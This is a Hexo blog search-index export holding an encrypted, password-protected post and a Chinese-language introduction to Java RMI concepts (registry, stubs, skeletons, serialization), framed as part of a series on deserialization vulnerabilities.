cc72504832c26bcc484b61d45b6eef8e8b3aac9e62aee7beda05305e1fc0e9c89dc42aeb797bd711cf3903e261261c4fae58e2c07fe0f5f65dc9dc31f8317cbfc7000debdb4687cf338c34878061df5afe85ce175334afe6a83fbb57567faef1466af0527cd7118d7bbbfd39a67d21692bef440092edf1e658c36e0b73624dc87609a729f486860beea4dd018df23518a7c80de13f548f312f802a90b591083a21207103c8e93a77fbdef3223409aa34102e006b3975ee1d2dbc89dcc1984a06a8c2b0fbfd7f5a94b31ac1b8c2db41f15ef5d0eb3808bc150faf8272c291a506d187bfd0171730b68437ac1373d3f8dac0bd96326677b3bbf9401da30b08fb20d6ec75ce99d3b7bc9fe63dadd05cc96c328938d23066bbfc2808ecf4485e058da3a2fd5dbc2ebdf046d494ce69bfefb4b2dc288dbfead5646e6dc6061b1eca08bdd08b05477e41c12c19794ca9ec7d34fd1f8a282261d010d072da0f3a76718a8f8e9ad81c07228b26e407175c2a874d73ee7bc0919097b32d7f4fb9d5ea8da8511ffec318fe70c1f7388a3fc6d9fbf1a4ecd979a0577a537c990c129cfb773b48b9f7f55598fccc8ae205fa223921db5e7012b1a78aa76d7ffbb03c30e6ea4583caae44f6831aa72f065f3841f22b970bcbe9bcf572ac0267068e19bec067e0e255485b850659abb1407b393e6f85de13ed18d68d408b88b38bffff86d03f1dcf8a3f205a31e251a31904ff7084d1c830970e1c26ddf82f15ee4246250e93dca2a90a35f3dea160c963f0acf89a398d264112465ad532c48172772792fc550ddd85178e28ad4ec98d5a92e36dda412c7469aa715bc37d296ef8fd060e55ff6338d34a26c5aa3e12744bfa7a30545f4fa492159562b9a710bc96fbab608a38dff870ffceacc8bd9883cb3ae8350d9572a901c3da0086e9e6ebabdde8f5ba15b6f7532fe940b28eaf82fcab09d670bc43ca586fbf79cc289e866a2d78548578cff6556a7151e4fc5f0591e735a2f7c2210755d702da09f10e09899d32d776b29ada29bb087ba1c983e1809665d21abb13b7dd05c93ada684e84e4f1b1a1fcd03f3fa2c73ac56a96a380b93c332ae2da5edad49191b305e3cb8ba6179b6ead5b0768a551dd7a8d6fd7b36143afeee43f466950de77b4abf998690e21cc1959f4477fc3161adc5e9e05d5efb53cffc036f59a434493248da680e3574c6cd814259ebd457550de5e160fe59f53aaad80d1aadb5c4368a3a15de634938a7e4f2ef0bc46ce2caae99c8e902559a4c939ad0c2ef9ee04fd60a2e145c6d1bee81b04822b38d75e0fb1994d04db66e06602e45ed248ccecc63c922ec9d5878c8e88face8e7c0cf44820d56ceaccd632ad59031e8ad83a44079b6d2d5d38885954102f36f417f41069baa86ca8938cda784440f6d88fef5cab971b189c44764a9a6175d40e723627ec4cc90a5c2e414eb92e4a0c4ebcaaeca805e4cd41bf0fc8b9dea57e4bbf03e47c14c276f1217386ea493b7e5842163783033c8dab6ab83f65db72af0d9deff3283449ff19de0289fad5f3e5f7bf970a261b0e449a9003e15667bfc17951eb4e05ecfac0787951c43afe6b34fc0507164ec791398c8991ac741d8a34683cb0584d28542815bf3015893e08d17e509e017e9d26a78677b2df44d4119815c9c37738163d2c44152c47152c46d7edb2768f51dc44a1f653fa4ed969ed7d414d6ac881b5158764be4c92ddb41063154afdcb0212be4f7446c1a6f720bb27742466a008611c46ecbd5e7a84ccf9bfe4ef73b79111af65833f06d2eff00510a294eccdb2e00e94f27f66e87e4d7b10cab54cd02ab14aa680346ede09ea29e6fedfe55d2a7d45ea2c595aad83a306f3c422cae15e4aa1f65695f9cbbd36f8f83743383a3a0855c25c40756dcdaa921e20ec76488253833b5b39e7fb7fac4e94e6d6235f8647a32e83bbf4d9ce5179c44ecdb38ab950da93043e9a85954c2dfad3af2b0a8d7f61a445b65fa28924b14e2308d17a23a77a205d134e6907066f0aa80a3b28295098ecc9a656d7809efdd1b46abf4d58693513b55a033d9632c485d7e30a299085786a4d87820eb3ec5d94ce31dc850a702ad5681fea059f28aa77ddf852ffc4d3039af26a0b6703b42c647fef0d7438007fa9cf897bdd9a7509a1564fb9f446e11a3b4140320513d16e9a0fc3a3619a31f2238a70a1096a73eac5b65cfef08dd14984293ed3cc93a28ff3bf07f24343ca36ca0aa475a810a27d2f17706b54f686a01c241d51ecc8ceb8f2c832ad2270f015880f0375abe7e9755261f7bc397c6e7a7b7123005168c7546efbcadd122d78e625e807a320e797b5cf1771fef7e71e0a71d5192e92d7cec7f91ed892c87b996a1d1341480a6ff4d2f39fec4a0b2bc3ac8d406c9095378e27c3f3df93d10d34055ef85ace2532f4db7a246d9aa523127e46f005c51f07e00adbf94219e8386ee5db929cfdef5c1f9d36e0b7a779330f69f9723b56b4d65d668b0ad3ece9892ba99aae5e832d4202dd93d2e3954f723cac6c572cda8b4ef98a00f133ca8cd284cb3a208797514b64d4aa982ebda7a6a61595cea7e66e68adf11d1fd9b4e126d600dfd928e18c3dc4559af5f8f6dfc5ff1328dd94c243ceb169f1f02841e2a4d650241419adb8441c9851a1ba09fd5d6963c5364caa799883437682fbfb2399b44a04a00ddc9a693d998f6ec308c7229f589b1e36f1b17dd7fb99da3e7a8b993666269c0d504408149033dd888dfa4c4f7375622066d38bfa95327d9a33c441a9b919e05c54abb852efb371e040d46a564e8683b49cee50e21998dd294ff4aba011a54e29c644c3d785222fed1432633f8de878f996d609b9a8aaab908831b74494727bc8bbf0a19065336822138987f6dab5a5f3ba517a072b8a17c81d87af11d59fa2dacd9b7aa9008bda3362c35f1fbe267abcb074e5a0c6b95a7340e70b695c778842c36b868fdee4efdc0614a159a17b324e80ac463fcd083b59000ab634ad0d3c0021aa27d426677ca91338edf3500f886f44e3005ca913ac5cd7ac1d7108f2112f07055a7a9442e183bb71cde3cd6bd724a940862dc8a1079ea1e564229004dc4f4048ec6455afe7084765662c55fbf6b1f1c7b9ea73d38c68d8a9114f59e186866c37756fd926367714c321404bc94fb37fc4b8a4f38be9758eb5d539d0a9b14bbaa354c11a4f2cc28c220fb854f655423c4a409478098415afc65362e95659a20e2ca550a250c32ce1068a7ffc539a43e95dfeaa3ac391576b4cc9e9a4a301498abf64acf1973a957da909f2a98f0e3899371a5337fcd6a3c0ecb0f39fb8ca9750735983b2de58fe42a58ceb3770cb8d5feda7443e5844c4fa92765bbf5feb30161b797b75009f3beffd4a63f960f76f54a2cd75bbf870a4da6d8188eff23b77956806fa5415cc32de1e8e777fade6d022b229163ded53376c6201e44d53338d9252209b813c4de4d368fbbb1c74f5a5c33046c6aaeb2604b4244b20da3b81af718f46cdfb9a52dc5d507deb722fb90f02b06e8443c56df995ba1a83d2bc1a7124e4e29cbeb7fca58314fb18e20f9df84ab3f9eaf9c633659881468def186ef28752bf5514818fe52f4ff3bcffdc440e913534fedefb7c61f2915ae6a7da16107571f38728e0a5dcf479d07c927d26563a4b2427e5015db62f8259bc6dd7b0af9f8b8f3eb3a04d8e56b1b48b5abb7407d01617b3c2678e7ce48824997b905cdcb0d9ce891804aeb363798366ee5ab2d8ab0a4a23ae02394aec2d62040f1652410648b786ffcbddf052e4af68a24b4a875cf389322314bb8aed3c0dd9bc6d89cc068ec2c23c53974248cc589e56335faea59309cd1216e5606989ae8414130f3a2fcb2a531b8982ff02bfa443d59d32a3b934f13071f036117b79785becd44690f631bc28b6cba5847e0aa911060f69f305879249853661039ee3214f4152976fdf2665c8613f42d6e537793f7c6bbefacdb0b9fb8efa8fc7802f3ff7c596a376e0ea6f9658a7370ca79fcfc50f5960fb953c3255a9718aaddc3422c2434170b777eb8d33beabcb6b823ffb0327a259f25b2be961e3bac0636da9816d01f324c6b1c3bd2a7a91b5919f7132ea250a3c8eb3729f166464196c3d83b563d8c7a79565269c46b8ccc9f00aaecd33124e3634fe3fabc17ee1ffabc2740f7f584e193b147dbfbec6e65e038b52d62efb640076cad4a783a83ffe6de590b4c5980fa19563d0729fe728c3788c80546fdf40ce00334b9504a3a69e575354c819651fe2991aceca025362f5592a7521cb5b03ab22d08eeb7b25b5f692c400d86220a4326f5f8dccd9a0a090916dd1177c11de2b80ba1f150696034ad71bd9efd9f45ad5e1ef0a7915a739b17861f409a8fc4bb2e4ea83a9454f60583c1f55a31c19432c4f20a3c2cfd5ce08b62a4d3d451b15af13c97fcd656748e05251c6c1ad58422822ba925339486e443d4e8709d8982f3f6fbdea3357bed9c497811df0ea17432a06139888e562c505134173b5397e1d6419ca45b67f3e01d50ead00865cc7cb8bbccc483d1c0de4c7bd3a5bbe0616ff75d96a13de206cf3eca6268fac3f45a3ab28c1fd0074040a472e8f21e80867afa35d749dcafe303fc851b5b8ccee2bda7d99225c99380393538a35fac5f6d3fab31d25ba4089f9f11165e68bd8f060f304979e4267eeaca593f8fbdbbe9a0f8cc2afa3629b2055239fc8c4ecbc56535a618eead191f2ea80f6b96fe9b61a2efd3f95e57a5680692a1526421cb0d5df61f5b334bbdccaea41423b686d2aa4989c5cf820095ac9f1d39be67f17bfaa7084fac342d5faf6b7f6b95c123ca3876d788257aa271a0e3712c937d53f1995feb00e868915e6368d622a6a3b1d140de0de0ba8ad3f22086bdbdab51ca4d63acee35ce1cdac897e6bba9cb6473851cb2ce1e1cab5e855f309e032d6dd7a52358ff3fa664acc9bc69cce69c70482b4adbaead4c85172b6ade1493d732f679c2b9e778db8855477fbd2ad581e472aa7b443f1558065eb1cc9eac6f7e4cc006f8cc52bc862f9fa5d38795b35eb4c58f0b63cd6301260a4fd49d4f5b950311aa5ffe651a4fd01d75bf1f321f9c880481526d12625217f97c110a66ff8263bc49bdb6836fcc621f8f65400bbf5d647e43ae14e3463cca03a5fd86bfb15f969553bb09b26462da7f9bb15ba43d4de4c5dd9b4ff136022bae8a38c3a37976c84c390c6da39901b289e686c72c04c20380c2b962093c4d19e45a50067db18fceefc447c722db242f45dc6d5d618e4d44c9967ca07fa57899f2124914be1bb23f145804ecb42a56f143d455c6ef7905883bc3835335c73584dbde98b5b4a8b558631529f6115b70bdd919f09139f7a1d860f5ef5fbe7c9bae5974d62156a1f8b36e6b31884b61312a9f13b34fd6d67889903ff88d887cc8e17882e2a5e903b4fa81a8f6b7af48e23f1fc9f3ab4fbef289840582a0bd5b15c482018fb538d6d773a5b5f122c9c48a763141961d358ae84ee17f5a013bd42ccec809bd6ce3d8c2ec20c3682c0de38c7e4e133a3bedbf6b68fde4761ece8124f71687e002d206f532cb6e02180e3afb52f5dd6a14b0b5052c69b41291fa73522897fd3b9eaf0e720434fe388146fd593ba24f3248fe44f5ad052d87b92f6b1ef07c790e374439162ec9f125a90b8a82409715a447bdc74cd42d0f34cb4c28310d49ec7c605cd41d0d136e21101264484807dd6178eda5f23bf02b0411c9d87d15aa456785cc76b5f8991c413890a29bd6cb5ac5a7dd4c973fa4d69329c286724661b582ffccc0009bc128891f50c4ae8bfb2d2e368e03db6c15245bf7105ec1033ff9a26231f11149f59bedae035929d3726da6f912aa7a56ee21568f31f5c4a6c46cee957d8ddc347682daae0cb061e6f3271cfd8990cd2ea3586e5a918b14f647c4299976ac7aaa30429e517bcec843a28d15c42c62c2040e0064f329c86f0fe4b8517cffe301a1c748e28392e1e20a00297488cc580081b9e3481113f9675c497c693eea6155bc22a748af475f4921d6145d51c16239f8a058aef45351697bf73be55320fee201b1bd4e0d74d1eee8b9db3c029d347aa61dc34a5ab1c9e633dd0894d19b400e26cb133e6515d454c524c758b6a4bcf79021a3212d2d4aa2030b7767de322411178f1a7d8e0d762835c29978af8897308397baba33614efd6d3031fbaca18ed6cadede93cbc9c61bf87db20ba35a2d3a5710cbdb12554532969e7f8ebea54502a39de8fc1bfd87554bc7a99d78f4f1e8c31972596ebc1028652a1443252999c830ef96bdbb5a990147994f1add419735202df7a942239f38cb9d9fe67cf9eaf53761d542d1604ad44124a1e23be2227e0426f55052b7f241cb541403295fee4acad62d901c86d2a3d91e75a7d9f165666b4b4a8a9d6311055e7a4250d1159729408659bd053dd24e4d3a7cad2c20cf5c66194b132a3f45bd6423ea28097dfcb94a3f3413a5869f1116fc974f0d017d7a0ae9ee6188dd35deae93b2f0e7206e4afff366751d644c7b8b07a56fa4b277aac792c7ffcfc0e3aaf6b08957146ab1da76afd41d9ac39a8332a02d71fed44a0fe0b14304b166fdbfc32f2ca1af657e9ac7af3d00dc618b447579776a0cf2f5bdc1be0778b59f89fc880c004a84d82ae22d1fb75322646241b5d99996a280bc0d7f3c1c3478bb5191786cf899fb4ae550b73cdea4a7da7e09b8986d23e7eb5233d9bb2940d8ed07eafea9f4a91881d8926a2c27ba031f51f1801bcdf259b3a8689fee1c39cb86b6d039069326e41c908191eb4159f9df95e9297a97208175b9dee32cce584e2530b1090414528aaac1908cd0e771844742324272a9f862d9c571bc12f9de844b3f9e64dc972baf0794400b51894c8f35d8ae73ca05a0e06875c6ec702caa9a4b9cc9139f0783b13e76967442b10aa38f1c17170d6c7efad1d7a0e6ac40678680aaa88fa14da4992c069a3eb55db612102ff5791ed4607fa2ea18c4407160fa1e4f7850005021ea7aa005d042235638c9b1519e9dc70f5cd5ee1f5afca19659a70854c13948e1903972984bea1223e71dd1289fe0a996fbcd336173f2bc34a98dffe784fed60a3f4acb6842aad069d4bf197b261f75af40676a9dd7052a7ab9cf6b05d6eb544496e16d8df58f480eae1139c201f416b6c1544203f63f02c59d9cd85a5fbe569f5102507629f4ae52efe308ebc9908241ef2426c1ce440e40d6bedd8f98ebf2e578926fce9a9d68cfdf05c95b74439d22fa56009fe589995706485262bdd8008200c1d4b69f5c5833c610ec184d4bccfa46f4e5f772d1df445157145b728c5bfef78f05257073aff4ca8a8a812eea55302acf39fbfeee25fb0e5222f27acb34d150b0f3f983ad764141776cd3add09e98225718e2320a764e9a039bb101fba5ea53542ad328520564f0a8a7db3076e8c890c7442a0efdbf5e12213d29e8b13bb95a13373ac52660dc47dcb34b79a6ea17adb9a4835a3017c8c539128a547d447c2ea92fded9b46c96d0f5d97d022b7508f7d0b27ce6c08b66811b7f6364771acf3a7a8014056a46fc2ac8047d41f1082c436a9acf2960dcb246d77ebfca841675129988180b64b9a5e9daf9c12caabfe69c38e4a299ab43bc354942fce7bb3d9ce992eed36306e1131f0c137e95c4939cad852c5fe0a0cb719b08d72a5b73d01341e9926ed08e7db58584698d49080912c1e077c1281583bc4433d9b46b09612467aa68d165752af3ca79f9bbdd595ee32a3f363fd7dad18197ffcf4781b39aa8d3a5f8d53fd6d8c1fe69b97b003e05a1e337a69753b40be85806e75dd3c41013d159b739eaee980b38be4a20c081f32cdf33b753204d6e546aae029a44247a071f575710c1520a93ef7972bbfd70bc670ef665dbb13f8d97a358975545bd61f850e4468472b199610d3b13203a2af542c843e27227906dc2cda628e03e5a6d6c9348216fd05b9141364e4c1cc2f8ab4050b4b8fb8d0c41d12d2e2e6aeb028e77cbd5cbee303bddd254c45741afdc2e1fddb1d26a56763bbf8cfe4aca23e73e4beb9e9adaa8bb416d5f2ef9c4a01e2f99701b57f14bff96de9a028f0bffa8566289cc96c54b22c6642c0ccd10fcd5398c6c1343d3cc26c9191fd68f715e61fded420d4bf1cda5619bc5e5b264ca41aff582cf2cf4a5fe1dae0d4f05bfd466826f06465161c81b702adc4a242848e9f074def4bd978d4906734e9b99a4caf6055e8d47d9d91fe62791ad8c13ca4b53ba685f31aa51409c09a0d364ac1153ab1fb6b941ad2ef9d369e8bd68414ee058e861b32d299e6c6869224b178851e582250641e4f93d49476726d5c264fdd0597f9d0f8ac255b9ccbe3624d0a829f927e7ad3f5ab981199c3b355e298a7d1dda56d146d423c668dc9a563ebd39377d37ca4c5c13a227fefe175ca6f569804e731b7a0543fcd79d9185150ca32d596ff34dba54ffc007f0518ebaa00038df523b1c10d5a73c796066878b089be3843bd260c166394ddf9a7f904faf9d7ada57f5a50982424e3ece443576aff8e2f6449d15f2c5a417fc2675a27e970bbad763e0a5a42d97270a34c8753974d2f2054602956cf59e3a8f1020eee91f03285a8dbc53051953f56371c0b6d62c9f765cba20039dc51cd49c4a7f7d3019d99478e62d5f22c8b57f678a52004d3f8e1f232bdcb5ca7fd4b44919772cdda1da88b46b13fac156aa02751e11b0387595fe4275b7335d2e6804b164d3da6195796e271e3649052c98c37abb063ec48421201d954a8844ff25ec9669d1e1e76683176ee4fd3add9f9cfe1886c60cd175d6d3f0e2e283b2cbaac4a9cb87b478dfa1a91e2479738bdf4aed2884c5322c3533a9ee2d9879949c12078ea4760ff4a9d15a0e2422c0ba94194f58d2be7de42e2fb8a3bb8ba0a929d7613424cabcd3f5e8c98c1c401e7c6311780d558f35d6ea8daec3ac6e45964b6ce7d0ebcda2cb19881b5ada09a1ee85bb078472ad3eb9c4c1984583449d618aec7b7fc148a87e0a76e3cf98549da2f9bb07969e06e448baedc1256c9b89246a56bd77a6e9bbb35e1e230ad72c236704caea66faaf82db0940ebda25771e01b0596dfa6af5b62222d35dc3eb086b3002c28c12ab573f3a84d594a189d46d5addb8bfae0cce789b1ec18a0d3d08088ab350e7d0da0cf7f732b4b688255474cd187e334209d997992d01683b71829c62196c2ccf5f6efc47da04d80e994c13a06b712f25b42d9e724b53459123fa4c44d76e6f66cc24f295d4cc90cc1a25055a81c8c1021d280b58f390119d3a1e839e788775c3293a7ed29e2277b1ccfd3435d587b2a9b0909220535f4ec7334757991d7c00579ffaeb04d46593c5c566fc68821f23b27a5a8f36549c1381f975da02b7da9f1e2bf0815a969daafcafbae3b035c400b6da7fb6c074e2c6026051115c30d177d4d066bc8a82d9687ddb9b3862fd0ce517d85020f98932a60d4651de38ea42d54983176640d3781a656fcf8c6b77c55d904264d28a077791f1205e84e2df4bad561818e52d43585e8edf2f185db6d2330f658fe3421527de93b47d5594e0a135aa162fa5daae0affdb68b499b275c68c7d37230648d6af3e93e4fdbca733cc79007c4004690b81baa9a92f43fc4f3a1f04150c7e4ca012f4fd80057b247d55033c851c223b33bc40ff191ccb3689205c4b4b0e01b3e939010b9fb3f1f078770fee12968027a18738d08382aa18040a724e126000ddb1e414839e536dd10ed14af5f16d25748b90a2c560c23a160ce2c1fb52c4441b7b2b44d229c6eaa260c0223a8a1a8fc2e0eac6f807544037f14b06c760fbc9c9ecc39f7c2b4f214ec8237aec108c35ab1d29ff668e00101d9c265f550f25ede9b959c7a93193a3d4575ca15d5f07ded40c2dd09ff6dc0e4865c2b3a8187db4669cd1871415088d6f5fe09c4a429d92dbe6cd733bc6c072078378f687a308a0397d2bd009befa06e2af4ac4cf00ed57bd44cbfc9070c79acce5eb76ff8aa5f6c949fea57a79b012af0731c44daeff8b2bca19e3b55b49564f2f26d8d1a187cacb59048d4bcd30f50eaa627a098e607092cd0c0ac020b7248b8313f25f38811e65e5ecefd5ca1abcd552814067fe9a29f41ad63e5c5ccab44319d7496616c69fc308efb370f26db130aa5370585741ce02a96459640f810a0ce30570f9ded772cc14a69a66a6fd170dafdcc79b654d5bd5a6e617991d3ecc35fd0bf2734af6f59b6c0813b875b42d4ef8d0b3f908c1e338db7b48567a4a7141d7a32a59cd96effd25480e0b44dc28e20207b720f66e99fb3819399ecfff7458ebf46794f440a9593e5589ac17f6683c55f6f15b58e6ddc853fdd2bac1be1a9ac21f777fb40547e46a45b2e786f9d46e336f4675250fc9da63104e8a5556dc02407dc4d19e7a9c23b534266d57dae96da587e8e610dbb7da8a020db5ed9cbce22368ce9a4eca04082c4f57ee045ff2b13d293598414196c359c1e1cb38ab69d6e51fb15986bf061fa84c4fa89976337312cbf1d68dd05a6904f2c6498d540a4b2bd57aaab61e743ab3699761644722c05081e868211dbf85f8a5a337a0e0681c1c0db9bc42fbf72688ad3191243feac4145073f23a632b7feed3078ecc66eb14e7847c0fca17cbed2d9c7ddcef02ed815942fc992b8b5563115b10edab2fe7a98ac8df320430e46e778bad594ac9a9f90865e8c97689c6cae9875ead66177cdb5e508d0cd2dbe5f684265a320132caa25beadec2507e2dae4b7f74f31c90b7b8a5403ad4bf88b2b5aa735c15d91bd6821696fb0b7b591ba0c924c406467e2ee282787643f154596ac696a9c3687f30fab4de2b83d01d344e991d10e6723f414d458518273349f618753f8a231bf4f2d78cd20c7104a5b3ea07aa3565c742988717662ce650b378c6fa1b0598db8a839a36e58642033a86786db174cbf873551c807da736c6c15b451a1d341b388c785f0e76178a3110368aef3a302e16d97d2b9b2d61fc1627cd9ccf87ba93a470fd57ae9de0e4075b4ab93ec60abc7cea86d575c9990e4ffabb9fdb31e1fb51daa7f1393bfeb07454a9d923ec1f3b2e997b91c5bcbe3e1c42a9a659c7c538b638ffade857e00e1957dfa2d77952d84627237d2cba0e9669afabe887add0ba8be551485bf1e93abf3a4f5c4c10a229cfd237bc0a77159ae772440b55d212cb491a0d4bc84e94cb38b970db1a6914445dc2c0a6b37368cdf35e3373c6e4301d413b8d65b2122dea71ca4c738f14fa4a2ae3b6ce942c3f8533f5f8991c7d0641b837686d896bbc156df4cfdf0e3c8d5ecdb05a26350dcc6a6b0020e0254a99c37642d45a80a159840abc68ed1a73c3652ff88d2db2c098837c47a3264156aef83349344a12b6462b9110010d1b33969a01b58270d6dc10d8024eac7ed77f9ba72929c9e2e487085abb4c927af25966427e15ae63008451c99ad7253cd25d220e49d2e8bbfc367cd93849cd2d64c1d8c4d1714f2f34bf25feb526ecd7d39e545a0a2ca64307b79baca225fc29fd19b9f4516c6974e3606d97857615510b8dc659f936701006281f7bc17b372ed094f0598c7d15432c64bb42a2653653a0b8b2f2dd2ffdf1ed0d97f1712cc5416a265049b197d6bf48e54716e310b55c9ddb0de88b7f0cb70fdc49e2bbc6d2afcd1b41b2f061b65f8739e24494ad51f96f58e77406b13a3c8d93dd25f82fd0122d24a4f91d3e54142dc6658be88bae7c667a89de0cff3b7786745f986e5f99fbf514a6c20c7368cb6b0698ebe73e9a16f1d6138c70612ffe0ea0174b36d8af44150fec43462dd780b4bc519146cbca02a1121653ef5abf8564451b1b3f91113dcf010c2854dc3109b988569e96178330ba65478fb7b7645d7ac3a2477f7207ad97c4b213681633b8531d9519585b61b384c29a3372cd299ee7cf18fa37be5778472ac3f5f0aa172035013bc4359ecab583de73cc1da40f7d2e9038bad7eeb201464b9287afb6531c0919bc1d74e8f150d5bb671816a7cbfba2e3ffcb24cae9d5c710d0411123fc22ec75a2d04fa13ba8e4a873beb3a9151dd9aee9ae54ad9c9e5f847252b5e58b2d9ef971829a8bdd9b675e4957b465e3326113c98b6c0daa6932695d52ffa6f7ed4be836968d5f800589ab3e23476b1b9c929d333bf137bd65abc1066bbb296a80e67a4c24303ea1f1d293b50d3f32d589fbe66d068bc320c5ff4ae423044177cf6f980b1dd553643ede6d1d376cd98d68e65a6ec5b323ca6b1d35d749ce5a5899671014057c60047f306c0a33ff2bb360714ddb8a6bff2e5d4dcde770762a0b6393a1e9c4c86810a5a22f08312f29d6eac7e604085cfa446295e3114fa6e5212fb2ced11250721902ecc6bc45f18ec42f9efd223e96d0754e4ac60c8b6a42f068c33d1ccead585d732841aff1f5e886ef96eb52008b5277fd467d39a2a7c4c339e1b1e390113d973bc3d69b9367c59b46e8bdba3864c8c88e3c91199e66c5bf1647bfe9a282672e2bb0986ffdb361b0fed424fe6ac61af6b3b0c6230126342fe625953b8623ec585be2e96c782900f0202e798c96c74240bb863386d4fd6be7d8242a89db42a74537c811b30bdf151b7850fed9af02c9c7d0c73baeafb7dabc62a17b672259d4bb94a1c4ad07509438bf3d76dd83b552ea47987a8bfb2206982add2d17277328e6ce13185284469423257dc1898b81dd222a8e0e1ff75cf64ee63de4147955bb3cc74ec3a17c0dd18eebb1baab4d0a74c056f2c638b46a7b736d98cf49b22a2b90fe89565898afd3a24d3deba058858d527e98ae80f2f4cc55be6cb4806bdebf61b98cd90e0eb1a71060fbc7f1011381014ddcb0881104360078bd5432ba5325d490a3bf091b3fbad3f680e36b6cd628062ba4693f36f46652f3f9f187088d63686d0ff517c3e9a3138e0a23be82aa0a08fc46bf69154830e6bcae8a98ea9f2b95557018cac4fa9b155300fc543</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Development</category>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化漏洞之JAVA RMI原理、流程(2)</title>
    <url>/2021/07/25/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJAVA-RMI%E5%8E%9F%E7%90%86%E3%80%81%E6%B5%81%E7%A8%8B-2/</url>
    <content><![CDATA[<h1 id="什么是JAVA-RMI"><a href="#什么是JAVA-RMI" class="headerlink" title="什么是JAVA RMI"></a>什么是JAVA RMI</h1><blockquote>
<p>RMI ( Remote Method Invocation , 远程方法调用 ) 能够让在某个 Java虚拟机 上的对象像调用本地对象一样调用另一个Java虚拟机 中的对象上的方法 , 这两个 Java虚拟机 可以是运行在同一台计算机上的不同进程, 也可以是运行在网络中不同的计算机上</p>
</blockquote>
<h1 id="为什么要使用RMI？"><a href="#为什么要使用RMI？" class="headerlink" title="为什么要使用RMI？"></a>为什么要使用RMI？</h1><ul>
<li><p>一般我们想要在本地调用一个<code>object</code>的方法的时候，会采用<code>object.method()</code>的方式来调用，但如果提供<code>object</code>的并不是本地的<code>JAVA</code>虚拟机，而是远程的<code>JAVA</code>虚拟机呢？我们本地并没有这个对象，那么我们就需要用到<strong>RMI</strong>。<span id="more"></span></p>
</li>
<li><p>当我们<strong>服务器</strong>拥有一系列服务，想要把它们提供给<strong>客户端</strong>，但问题是，服务器只想提供它想要提供给客户端的方法，它不可能把自己所有的对象和方法都发送给客户端，让客户端去调用一个对象的所有方法，这是极其不安全的。</p>
</li>
<li><p>假设<strong>客户端(JVMA)<strong>想要获取</strong>服务端(JVMB)<strong>上的某个对象<code>ObjectA</code>，但下次程序修改后，实例对象的名称可能会发生改变，这时候</strong>客户端（JVMA）</strong>并不知道实例对象的名称是什么，也就无法获取到了，又失去了与服务端(JVMB)的联系。</p>
</li>
<li><p>假设客户端找到了想要的资源，但<strong>数据传输又成了问题</strong>。这时候获取到的是一个完整的对象，在远程调用的时候，如果先把对象分解成基本类型的数据传输给客户端后，再把这些基本类型的数据拼接成对象，这样会大大增加代码复杂度。</p>
</li>
<li><p>另外，如果程序需要频繁的远程调用，开发人员不可能为每一次调用都设计一套调用方法，所以<strong>一个统一而规范的接口十分重要</strong>。</p>
</li>
</ul>
<h1 id="RMI工作流程"><a href="#RMI工作流程" class="headerlink" title="RMI工作流程"></a>RMI工作流程</h1><p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJAVA-RMI%E5%8E%9F%E7%90%86%E3%80%81%E6%B5%81%E7%A8%8B/image-20210725210630532.png" alt="image-20210725210630532"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/640" alt="Image"></p>
<p>上面这个流程图说的很清楚。</p>
<p><strong>RMI有三个角色参与</strong>，分别是<code>Client、Registry、Server</code>。<code>Server</code>向<code>Client</code>提供服务，但它不愿意将所有的对象、方法都交给<code>Client</code>去调用，所以它需要一个“中间人” - <code>Registry</code>，<code>Server</code>把它想要提供的服务告诉<code>Registry</code>，让<code>Registry</code>和<code>Client</code>去交流（获取、发送请求），所以它相当于是服务器的代理，负责帮<code>Server</code>办事。</p>
<p>那么<code>Registry</code>怎么向<code>Client</code>提供服务呢？<code>Registry</code>上会绑定需要提供给客户端的<strong>服务</strong>，绑定的时候，会生成<strong>对应</strong>的<code>stub（存根）</code>，所以<code>Registry</code>里有各种服务的<code>stub</code>。这时候<code>Client</code>如果想要获取服务器上的某个<strong>服务</strong>，它可以直接在<code>Registry</code>中查找，如果找到了对应的<code>stub</code>，就返回这个<code>stub</code>的拷贝，这样他就可以直接把<code>stub</code>当作一个<code>object</code>，然后调用里面的方法了。所以，<code>stub</code>相当于<strong>远程对象在客户端的代理。</strong></p>
<p>Registry除了会生成<code>stub</code>,还会生成<code>skeleton</code>（相当于<code>server</code>的代理），<code>Skeleton</code>用于处理<code>stub</code>发过来的请求，然后去调用服务端的方法，再返回给<code>stub</code>。但在<strong>jdk1.2</strong>以后，反射API替代了<code>skeleton</code>的作用，它可以直接把请求发给服务端，所以就不再用<code>skeleton</code>了。</p>
<p>客户端调用<code>stub</code>的方法后，<code>stub</code>会将客户端想要调用的方法名及其参数<strong>序列化</strong>，利用<strong>远程引用层</strong>和<strong>传输层</strong>（<strong>Socket通信</strong>）发给<code>Server</code>，<code>Server</code>那边的<strong>远程引用层</strong>接收到数据后发给<code>Skeleton</code>，<strong>反序列化</strong>后在<code>Server</code>执行被调用的方法，然后将方法的返回值或异常打包（序列化后）返回给客户端，客户端再以同样的方法<strong>反序列化</strong>解析返回数据。</p>
<p>这里需要注意的是，远程方法的调用最后都是在<strong>Server</strong>执行的，最后只是返回序列化后的结果而已。</p>
<h1 id="案例讲解"><a href="#案例讲解" class="headerlink" title="案例讲解"></a>案例讲解</h1><h2 id="定义远程接口"><a href="#定义远程接口" class="headerlink" title="定义远程接口"></a>定义远程接口</h2><p><code>Server</code>想要提供服务，那么就需要为这些提供的服务定义一个接口，让<code>Client</code>可以访问到它。该接口必须继承<code>Remote</code>，这样该接口才能成为一个远程对象，才可以被JAVA虚拟机所调用。</p>
